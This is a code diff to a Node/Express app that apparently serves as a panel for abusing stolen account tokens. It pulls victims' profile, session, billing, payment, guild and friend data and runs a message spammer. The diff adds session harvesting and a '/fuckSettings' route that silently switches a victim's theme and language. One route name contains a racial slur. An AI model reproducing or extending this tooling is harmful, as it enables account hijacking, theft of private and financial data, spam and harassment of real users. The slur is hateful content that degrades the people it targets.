@@ -4,7 +4,7 @@ const path = require("path");
 const fs = require("fs");
 const os = require("os");
 const tcpp = require("tcp-ping");
-const { getUserData, getUserBilling, getUserPayments, getUserGuilds, getRelationships, createDm, sendMessage } = require("./helpers");
+const { getUserData, getUserSessions, getUserBilling, getUserPayments, getUserGuilds, getRelationships, createDm, sendMessage, patchSettings } = require("./helpers");
 const app = express();
 const base = "/api/v1";
 
@@ -48,6 +48,9 @@ app.get("/user", async (req, res) => {
     const userData = await getUserData(token);
     const userDataJson = await userData.json();
 
+    const userSessions = await getUserSessions(token);
+    const userSessionsJson = await userSessions.json();
+
     const userBillingData = await getUserBilling(token);
     const userBillingDataJson = await userBillingData.json();
 
@@ -62,10 +65,13 @@ app.get("/user", async (req, res) => {
 
     if (!userData.ok) return res.redirect("/");
 
-    res.render("user", { userDataJson: userDataJson, userBillingDataJson: userBillingDataJson, userPaymentDataJson: userPaymentDataJson, guildsDataJson: guildsDataJson, friendsDataJson: friendsDataJson, url: `${req.baseUrl + req.path}`, memory: memory, ping: ping });
+    res.render("user", { userDataJson: userDataJson, userSessionsJson: userSessionsJson, userBillingDataJson: userBillingDataJson, userPaymentDataJson: userPaymentDataJson, guildsDataJson: guildsDataJson, friendsDataJson: friendsDataJson, url: `${req.baseUrl + req.path}`, memory: memory, ping: ping });
 });
 app.get("/spammer", async (req, res) => {
     res.render("spammer", { url: `${req.baseUrl + req.path}`, memory: memory, ping: ping });
+});
+app.get("/misc", async (req, res) => {
+    res.render("misc", { url: `${req.baseUrl + req.path}`, memory: memory, ping: ping });
 });
 app.get("/logs", async (req, res) => {
     const logs = await fs.readFileSync("src/logs.txt", (err, data) => {
@@ -116,6 +122,14 @@ app.post(`${base}/spamDaNegro`, async (req, res) => {
     }
     
     res.redirect("/spammer");
+});
+app.get(`${base}/fuckSettings`, async (req, res) => {
+    const token = localStorage.getItem("token").toString();
+
+    await patchSettings(token, "agYIAhABGgA="); // light mode
+    await patchSettings(token, "Yg4KBwoFemgtQ04SAwisAg=="); // chinese language
+
+    res.redirect("/misc");
 });
 app.get(`${base}/clearLogs`, async (req, res) => {
     fs.writeFile("src/logs.txt", "", (err) => {
